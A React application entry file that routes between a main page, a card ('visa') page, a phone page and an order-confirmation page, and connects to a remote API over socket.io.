import { BrowserRouter, Routes, Route } from "react-router-dom";
import { useState } from "react";
import { io } from "socket.io-client";
import VisaPage from "./Pages/VisaPage";
import PhonePage from "./Pages/PhonePage";
import ConfirmOrder from "./Pages/ConfirmOrder";
import Main from "./Pages/Main";

// export const api_route = "http://localhost:8080";
export const api_route = "https://uae-se.onrender.com";
export const socket = io(api_route);

function App() {
  const [loading, setLoading] = useState(false);

  return (
    <div className="min-h-screen w-full flex items-start justify-center bg-gray-50">
      <div className="w-full max-w-md md:max-w-none relative">
        <BrowserRouter>
          <Routes>
            <Route
              path="/"
              element={<Main />}
            />
            <Route
              path="/visa"
              element={<VisaPage loading={loading} setLoading={setLoading} />}
            />
            <Route
              path="/phone"
              element={<PhonePage />}
            />
            <Route
              path='/confirm'
              element={<ConfirmOrder />}
            />
          </Routes>
        </BrowserRouter>
      </div>
    </div>
  );
}

export default App;
